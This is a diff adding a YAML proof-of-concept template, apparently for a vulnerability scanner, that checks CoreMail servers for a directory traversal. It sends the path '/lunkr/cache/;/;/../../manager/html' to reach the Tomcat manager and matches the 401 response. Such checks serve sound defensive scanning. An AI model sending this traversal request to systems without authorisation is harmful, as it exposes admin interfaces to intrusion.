@@ -1,0 +1,23 @@
+id: poc-yaml-coremail-directory-traversal
+info:
+  name: CoreMail System Directory Traversal 漏洞
+  severity: high
+  tags:
+  - 目录遍历
+  finger: CoreMail
+  osprey-id: vb_2021_0034
+firstRequest:
+  method: GET
+  path: /manager/html
+  expression: 'status_code != 401 && !contains(body, "conf/tomcat-users.xml")
+
+    '
+requests:
+- method: GET
+  path: /lunkr/cache/;/;/../../manager/html
+  headers: {}
+  expression: 'status_code == 401 && contains(body, "conf/tomcat-users.xml")
+
+    '
+variables: {}
+transport: http
